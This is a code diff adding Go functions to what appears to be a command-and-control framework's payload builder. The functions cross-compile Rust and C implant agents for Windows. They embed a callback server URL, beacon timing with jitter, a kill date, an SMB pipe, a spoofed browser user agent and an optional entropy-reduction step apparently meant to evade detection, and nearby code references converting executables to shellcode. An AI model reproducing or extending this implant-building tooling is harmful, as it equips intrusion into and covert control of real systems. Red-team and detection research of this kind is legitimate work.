@@ -422,6 +422,150 @@ func BuildDarwin(cfg BuildConfig, outDir string) (string, error) {
 	return outPath, nil
 }
 
+// BuildRustEXE cross-compiles the Rust agent for Windows x64.
+// Requires: rustup + x86_64-pc-windows-gnu target + x86_64-w64-mingw32-gcc.
+func BuildRustEXE(cfg BuildConfig, outDir string) (string, error) {
+	cargo, err := findCargo()
+	if err != nil {
+		return "", err
+	}
+	cc := "x86_64-w64-mingw32-gcc"
+	if _, err := exec.LookPath(cc); err != nil {
+		return "", fmt.Errorf("mingw not found (%s): apt install gcc-mingw-w64-x86-64", cc)
+	}
+
+	root   := projectRoot()
+	outDir  = absDir(root, outDir)
+	if err := os.MkdirAll(outDir, 0755); err != nil {
+		return "", fmt.Errorf("mkdir: %w", err)
+	}
+
+	agentDir := filepath.Join(root, "agents", "agent-rust")
+	if _, err := os.Stat(filepath.Join(agentDir, "Cargo.toml")); err != nil {
+		return "", fmt.Errorf("agent-rust not found in %s", agentDir)
+	}
+
+	sleepSec := cfg.SleepSec
+	if sleepSec <= 0 { sleepSec = 5 }
+	jitter := cfg.JitterPct
+	if jitter < 0 { jitter = 20 }
+
+	outName := resolveOutName(cfg, "agent_rust_amd64.exe")
+	outPath := filepath.Join(outDir, outName)
+
+	rustEnv := append(os.Environ(),
+		"AGENT_SERVER_URL="+cfg.ServerURL,
+		"AGENT_TRANSPORT="+cfg.Transport,
+		fmt.Sprintf("AGENT_SLEEP_SEC=%d", sleepSec),
+		fmt.Sprintf("AGENT_JITTER_PCT=%d", jitter),
+		"AGENT_KILL_DATE="+cfg.KillDate,
+		"AGENT_SMB_PIPE="+cfg.SMBPipe,
+		"AGENT_BEACON_URIS="+cfg.BeaconURIs,
+		"CARGO_TARGET_X86_64_PC_WINDOWS_GNU_LINKER="+cc,
+	)
+	if cfg.UserAgent != "" {
+		rustEnv = append(rustEnv, "AGENT_USER_AGENT="+cfg.UserAgent)
+	}
+
+	buildDir := filepath.Join(agentDir, "target", "x86_64-pc-windows-gnu", "release")
+	cmd := exec.Command(cargo, "build", "--release", "--target", "x86_64-pc-windows-gnu")
+	cmd.Dir  = agentDir
+	cmd.Env  = rustEnv
+	if out, err := cmd.CombinedOutput(); err != nil {
+		return "", fmt.Errorf("rust build failed: %v\n%s", err, out)
+	}
+
+	src := filepath.Join(buildDir, "agent-rust.exe")
+	if err := copyFile(src, outPath); err != nil {
+		return "", fmt.Errorf("copy rust binary: %w", err)
+	}
+	if cfg.EntropyReduce {
+		_ = reduceEntropy(outPath)
+	}
+	return outPath, nil
+}
+
+// findCargo locates the cargo binary (checks $HOME/.cargo/bin first).
+func findCargo() (string, error) {
+	home, _ := os.UserHomeDir()
+	candidates := []string{
+		filepath.Join(home, ".cargo", "bin", "cargo"),
+		"cargo",
+	}
+	for _, c := range candidates {
+		if path, err := exec.LookPath(c); err == nil {
+			return path, nil
+		}
+	}
+	return "", fmt.Errorf("cargo not found: install Rust via rustup.rs")
+}
+
+// BuildCAgentEXE cross-compiles the pure-C agent for Windows x64 using MinGW.
+func BuildCAgentEXE(cfg BuildConfig, outDir string) (string, error) {
+	cc := "x86_64-w64-mingw32-gcc"
+	if _, err := exec.LookPath(cc); err != nil {
+		return "", fmt.Errorf("mingw not found (%s): apt install gcc-mingw-w64-x86-64", cc)
+	}
+
+	root   := projectRoot()
+	outDir  = absDir(root, outDir)
+	if err := os.MkdirAll(outDir, 0755); err != nil {
+		return "", fmt.Errorf("mkdir: %w", err)
+	}
+
+	agentDir := filepath.Join(root, "agents", "agent-c")
+	if _, err := os.Stat(filepath.Join(agentDir, "agent.c")); err != nil {
+		return "", fmt.Errorf("agent-c not found in %s", agentDir)
+	}
+
+	sleepSec := cfg.SleepSec
+	if sleepSec <= 0 { sleepSec = 5 }
+	jitter := cfg.JitterPct
+	if jitter < 0 { jitter = 20 }
+
+	outName := resolveOutName(cfg, "agent_c_amd64.exe")
+	outPath := filepath.Join(outDir, outName)
+
+	ua := cfg.UserAgent
+	if ua == "" {
+		ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
+	}
+
+	sources := []string{
+		filepath.Join(agentDir, "agent.c"),
+		filepath.Join(agentDir, "transport.c"),
+		filepath.Join(agentDir, "commands.c"),
+		filepath.Join(agentDir, "crypto.c"),
+		filepath.Join(agentDir, "b64.c"),
+	}
+
+	args := []string{
+		"-O2", "-s", "-mwindows",
+		"-Wno-unused-parameter", "-Wno-format-truncation", "-Wno-stringop-truncation",
+		fmt.Sprintf("-DAGENT_SERVER_URL=%q", cfg.ServerURL),
+		fmt.Sprintf("-DAGENT_TRANSPORT=%q", cfg.Transport),
+		fmt.Sprintf("-DAGENT_SLEEP_SEC=%d", sleepSec),
+		fmt.Sprintf("-DAGENT_JITTER_PCT=%d", jitter),
+		fmt.Sprintf("-DAGENT_USER_AGENT=%q", ua),
+		fmt.Sprintf("-DAGENT_KILL_DATE=%q", cfg.KillDate),
+		fmt.Sprintf("-DAGENT_SMB_PIPE=%q", cfg.SMBPipe),
+		fmt.Sprintf("-DAGENT_BEACON_URIS=%q", cfg.BeaconURIs),
+		"-o", outPath,
+	}
+	args = append(args, sources...)
+	args = append(args, "-lwinhttp", "-lbcrypt", "-lws2_32", "-lcrypt32")
+
+	cmd := exec.Command(cc, args...)
+	cmd.Dir = root
+	if out, err := cmd.CombinedOutput(); err != nil {
+		return "", fmt.Errorf("c agent build failed: %v\n%s", err, out)
+	}
+	if cfg.EntropyReduce {
+		_ = reduceEntropy(outPath)
+	}
+	return outPath, nil
+}
+
 // BuildRAW converts a Windows PE to raw shellcode.
 // Tries the system donut binary first (handles modern Go binaries/relocations correctly),
 // falls back to go-donut if not found.
